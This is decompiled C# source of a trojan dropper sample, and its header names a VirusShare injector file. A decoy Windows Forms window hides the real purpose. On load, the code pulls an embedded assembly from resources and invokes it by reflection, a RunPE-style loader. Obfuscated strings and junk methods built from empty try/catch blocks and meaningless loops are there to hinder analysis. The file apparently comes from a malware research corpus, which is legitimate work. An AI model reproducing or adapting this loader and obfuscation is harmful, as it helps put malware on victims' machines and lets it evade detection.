// Decompiled with JetBrains decompiler
// Type: WindowsApplication1.Form1
// Assembly: services, Version=1.0.0.0, Culture=neutral
// MVID: B65915CE-7F4E-49F3-904E-5AF96F36C4FD
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Injector.ecsd-4ba14d84b652423432f53e225b2d9b4794804780955b901afce3089914c129e0.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace WindowsApplication1
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    [AccessedThroughProperty("CheckBox1")]
    private CheckBox _CheckBox1;
    [AccessedThroughProperty("LinkLabel1")]
    private LinkLabel _LinkLabel1;
    [AccessedThroughProperty("Label1")]
    private Label _Label1;
    [AccessedThroughProperty("Label2")]
    private Label _Label2;
    private Assembly RunPEAss;
    private object[] Params;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.RunPEAss = Assembly.Load(WindowsApplication1.My.Resources.Resources.ClassLibrary);
      this.Params = new object[0];
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
label_2:
      int num = 3;
      Point point1;
      Size size1;
      while (true)
      {
        switch (num)
        {
          case 0:
            this.CheckBox1.AutoSize = true;
            CheckBox checkBox1_1 = this.CheckBox1;
            point1 = new Point(13, 43);
            Point point2 = point1;
            checkBox1_1.Location = point2;
            this.CheckBox1.Name = \u003CCliSecureRT\u003E.cs("\u0097óÎ\u007FÈ\u0018 Ws");
            CheckBox checkBox1_2 = this.CheckBox1;
            size1 = new Size(81, 17);
            Size size2 = size1;
            checkBox1_2.Size = size2;
            this.CheckBox1.TabIndex = 1;
            this.CheckBox1.Text = \u003CCliSecureRT\u003E.cs("\u0097óÎ\u007FÈ\u0018 Ws");
            this.CheckBox1.UseVisualStyleBackColor = true;
            this.LinkLabel1.AutoSize = true;
            LinkLabel linkLabel1_1 = this.LinkLabel1;
            point1 = new Point(88, 100);
            Point point3 = point1;
            linkLabel1_1.Location = point3;
            this.LinkLabel1.Name = \u003CCliSecureRT\u003E.cs("\u0098òÅwï;\u00ADJ.ú");
            LinkLabel linkLabel1_2 = this.LinkLabel1;
            size1 = new Size(59, 13);
            Size size3 = size1;
            linkLabel1_2.Size = size3;
            this.LinkLabel1.TabIndex = 2;
            if (true)
            {
              num = 2;
              continue;
            }
            goto case 3;
          case 1:
            goto label_7;
          case 2:
            ((Label) this.LinkLabel1).TabStop = true;
            this.LinkLabel1.Text = \u003CCliSecureRT\u003E.cs("\u0098òÅwï;\u00ADJ.ú");
            this.Label1.AutoSize = true;
            Label label1_1 = this.Label1;
            point1 = new Point(24, 67);
            Point point4 = point1;
            label1_1.Location = point4;
            this.Label1.Name = \u003CCliSecureRT\u003E.cs("\u0098úÉyÏk");
            Label label1_2 = this.Label1;
            size1 = new Size(39, 13);
            Size size4 = size1;
            label1_2.Size = size4;
            this.Label1.TabIndex = 3;
            this.Label1.Text = \u003CCliSecureRT\u003E.cs("\u0098úÉyÏk");
            this.Label2.AutoSize = true;
            Label label2_1 = this.Label2;
            point1 = new Point(27, 117);
            Point point5 = point1;
            label2_1.Location = point5;
            this.Label2.Name = \u003CCliSecureRT\u003E.cs("\u0098úÉyÏh");
            Label label2_2 = this.Label2;
            size1 = new Size(39, 13);
            Size size5 = size1;
            label2_2.Size = size5;
            num = 1;
            continue;
          case 3:
            this.Button1 = new Button();
            this.CheckBox1 = new CheckBox();
            this.LinkLabel1 = new LinkLabel();
            this.Label1 = new Label();
            this.Label2 = new Label();
            this.SuspendLayout();
            Button button1_1 = this.Button1;
            point1 = new Point(24, 13);
            Point point6 = point1;
            button1_1.Location = point6;
            this.Button1.Name = \u003CCliSecureRT\u003E.cs("\u0096îßhÌ4þ");
            Button button1_2 = this.Button1;
            size1 = new Size(75, 23);
            Size size6 = size1;
            button1_2.Size = size6;
            this.Button1.TabIndex = 0;
            this.Button1.Text = \u003CCliSecureRT\u003E.cs("\u0096îßhÌ4þ");
            this.Button1.UseVisualStyleBackColor = true;
            num = 0;
            continue;
          default:
            goto label_2;
        }
      }
label_7:
      this.Label2.TabIndex = 4;
      this.Label2.Text = \u003CCliSecureRT\u003E.cs("\u0098úÉyÏh");
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(226, 142);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Label2);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.LinkLabel1);
      this.Controls.Add((Control) this.CheckBox1);
      this.Controls.Add((Control) this.Button1);
      this.Name = \u003CCliSecureRT\u003E.cs("\u0092ôÙq\u0092");
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Button1 = value;
    }

    internal virtual CheckBox CheckBox1
    {
      get => this._CheckBox1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._CheckBox1 = value;
    }

    internal virtual LinkLabel LinkLabel1
    {
      get => this._LinkLabel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._LinkLabel1 = value;
    }

    internal virtual Label Label1
    {
      get => this._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label1 = value;
    }

    internal virtual Label Label2
    {
      get => this._Label2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => this._Label2 = value;
    }

    private void g49nOWsy9I40XqC3cPjLkhrcd1()
    {
label_2:
      int num1 = 3;
      double num2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            if (true)
            {
              num1 = 2;
              continue;
            }
            goto case 3;
          case 1:
            goto label_7;
          case 2:
            \u003CCliSecureRT\u003E.cs("\u009FÃãr₹{\u00BD\\>\u008F\u0012ₛ'=⃓ò= ÀiÀ\u0097\u00BE⁀J\u0016Ì:(0ãº¿\r.?\0.á₍₾\u2069szú\u0091Qy/\u0081pv+\u0003\u209E‣\u0088\u001B?\u0010⁆ɏñY<ö\u20CD\u0097s¨+\u0010+\u0005\0⁎«Ü⃖cS\u206E\u008A\u009E´þ§|\u008AEè/‚!p4è\\\"Úh\nxÚëûÑ \u008F5µp\u0017\u009AÐã8 ®í⁔\u0014\u00BE{è\u0095Ì0oU¥p\u0086+â\u008F¦U>⁚\ri§₍À\u0003‖{\a");
            num2 = 0.0;
            num1 = 1;
            continue;
          case 3:
            num2 = 71.0;
            \u003CCliSecureRT\u003E.cs("üÄÌZÍ#\u009CZ6\u008DÖàAʆàÇ\u000FqÎ ÿ\u0098£jdNÂ\rú1¥¢ÃL\u20BF⁞9{·ÁÁßHd\u2069¶\vC\t¥\u202BŚ_\u0017°4₾⃡ƖAoÃ±no\u20FD\u0080\u0089\u0018µ\u0019!0\u0014\u001D\"î¤¥Jq\u009B¡₲×çãG⃫a»\u007F\u008D\u00159!\u00BCU\u0001Ǖabj®à±ï7\u0092%\u009CJ\u001F\u0098Èî\u0015wüǜ\u001F‸\u008AH\u0081·⃓\u20F2 q\u009E\u007FÕ\\ºú₵3nd:[ú\u0088é");
            num1 = 0;
            continue;
          default:
            goto label_2;
        }
      }
label_7:
      while (true)
      {
        int num3 = (int) MessageBox.Show(\u003CCliSecureRT\u003E.cs("\u2078Ç\u0088zåa\u009DŽ\r⃕ÍÀ⁊s\u009E\u00950FºAÝî¿⁇ťe¨,éSíå¤⁊g\u0014\u0013/\u009F\u0097Ǜ'‐%úÅ\u001F\u001C\u0012Òt\vAGò₩\u0095nn\u20CB$òÙ\u0006}\u0088ßÙ}ₕ\u0012\u0017zy\u0015Gú\u00BD\u0090%Z"));
        \u003CCliSecureRT\u003E.cs("òá\u008AAç⁻µv\u0017ÿëú,h⃬\u0084ǶlÞ3\u2087\u0082ßq$s§f\u0089n\u009B\u20FEõOJ!äjå\u0094Õ(z\u0014⁎\u0085lkCÍ3 b(ühË⁓Dʡ\u0010ðÌCv\u2061Ú\u00B2MÈnmjb;)¿ìÑL0ë\u20F7ₒ\u008AÊ\u0088\u0014¿q₼4NU?ŏúm9\u0083q‴—\u009A⃭₺ÂBₓ\u0003£¢/·\u2087À⁕\u0013ư\u0087>Ųtjåû\u0082vHoØ\u0003\u0089?ȍë®V =");
      }
    }

    public void foolav()
    {
      Thread.Sleep(0);
      this.qoskfjvcksfjru();
    }

    public void Gr0wlit_SeC7p0IUTEPmeF4()
    {
      while (true)
        ;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      Thread.Sleep(1000);
      this.foolav();
    }

    public void Gr0wlit_Uwk16piJ3bu753Cp()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u003CCliSecureRT\u003E.cs("\u0081îÌM\u009Ac\u0087l$¸Ïó@\u0006ôø]N\u00BESÜª\u009D\aP[©\tÿ-ò÷¡?'q1R\u0083çì\u0002J");
        ProjectData.ClearProjectError();
      }
      while (true)
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
    }

    public void Gr0wlit_CzJUxMaZJ23k6()
    {
      \u003CCliSecureRT\u003E.cs("\u0091¢\u009EI\u0095i\u009D\u001B\v ß\u00B2\n%\u0081ËSaº,Ôþ\u009BmWXÊ\v×Uò£Õ\u0017f\"\nC»×áyw\u001C\u0005\u0096\u001EQ\tÏ)\u000EH]¿S\u0096zS\u0005h±Å_6©Ü @ù>\r'+A\u001B¨õ\u0084X%ó\u008C\u0093¡à\u009CB±_ã\u007FY*(u\u008869Ø%l[\u0086\u0091Ò\u009EfÖ");
      double num = 0.7043958;
      do
      {
        ++num;
      }
      while (num <= 0.928786);
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      \u003CCliSecureRT\u003E.cs("\u009Fÿ\u0098R÷7¨w/\u009F¨µ\u0002\u0015\u0095Ì\u0014\u0015\u00B2hâ\u009A\u0086k+iÅtßr\u0082\u00ADÂMgr]<«Ì\u0090y\a)AÌ\u0015\r.\u0095*|w^Ò0Ö s7\u0018\u00BE±^0ù\u0095¶]Ïc;avE$¦Ë¨msó\u009D\u009E\u0082Çü\u0018\u0081:©(2\u00161D\u00814\u0011âsZGÖ\u0090ËÓ,È\u000Fþgr§ü\u00B2\u001Cxôñ\u001ELªuÆ\u0098¿4^zÏ\u0002äU\u008A\u0080Â/c\u0004[Rø\u0086\u0093y\toC¿LS\u001C\u0092N\u000EX\u0004ÁGò\0TU\u0006¸åF7®\u009D");
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void Gr0wlit_E7WVID()
    {
      \u003CCliSecureRT\u003E.cs("\u0092©ÍPÙl\u009D\u001E\n\u0098ò·\u0003)«Æ\v\u0014Ã.\u008E¨Âf.\u000F·pÂ,óüâ(");
      double num1 = 0.3227177;
      do
      {
        \u003CCliSecureRT\u003E.cs("\u008DùÞ+ä\u0017ÿ{\0üïîB\u0006\u0081í+k\u008C/Ú¦Å-N\u0005ÏtÆSý¿Û\u0010$)>F\u008FÆÏ\a\0eNÎVlX°}\tjR±7Õ&nVjÿ·\u0018l\u0082®\u00B2[¿\u0005n\u0001~O\u0004¦ù\u0085vq¯ºç\u009FÀ\u00BC\u0010Ç>ÂnWQ:.\u008C36Ø#~9ÑâÚåO×5ù\u001A1\u008DªèA\u0015·\u008EQVÌKî\u00BCÅnmy\u008F\u0003ðV\u0086\u0080¥\u001FWv\u0006D\u0091Ãá:\u0006n0Ä\u001FJ^Ão\bO\u0013àCÁtNU\u001B°ñ\u0018N\u0094\u00BD\u0088O¿\vo\u001B)8\u0004óðÑ(b");
        ++num1;
      }
      while (num1 <= 0.7901289);
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      double num2 = 0.1492457;
      do
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        ++num2;
      }
      while (num2 <= 0.4799783);
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      double num3 = 0.3634587;
      do
      {
        try
        {
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
        ++num3;
      }
      while (num3 <= 0.8759747);
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void qoskfjvcksfjru()
    {
      this.RunPEAss.GetType(\u003CCliSecureRT\u003E.cs("\u0097÷ÊoÐ\u0016¦M0ªïûBn®Ð\u0005S\u0088.")).InvokeMember(\u003CCliSecureRT\u003E.cs("\u0099úÂr"), BindingFlags.InvokeMethod, (Binder) null, (object) null, this.Params);
      ProjectData.EndApp();
    }

    public void Gr0wlit_CfPnKnB6YnrmZKkL()
    {
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u003CCliSecureRT\u003E.cs("\u0096ÈÒxñh\u009ED\u0017\u0086×æDs\u00B9\u008A\u0015u·x\u0083ùÁ\u000Ei\r\u0096\u000Eß#\u0088ú¥Ne\u0016?3\u00BEþ\u0094x\a\a\u0003¶Pu[®inc^ö3\u0090\u0018^\u001EdßôbgüÙÁnØd+\awC<®¯\u0083L!ñ§\u0099Èöúl\u009A9«.26:\u007Fò1lâ%_>¢\u0080ÒÆ*\u00950\u00AD^v£«é?týÄ#\u0018Ë,Ð\u00ADÂ\t");
        ProjectData.ClearProjectError();
      }
      try
      {
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u003CCliSecureRT\u003E.cs("\u009B£î");
        ProjectData.ClearProjectError();
      }
      while (true)
        ;
    }
  }
}
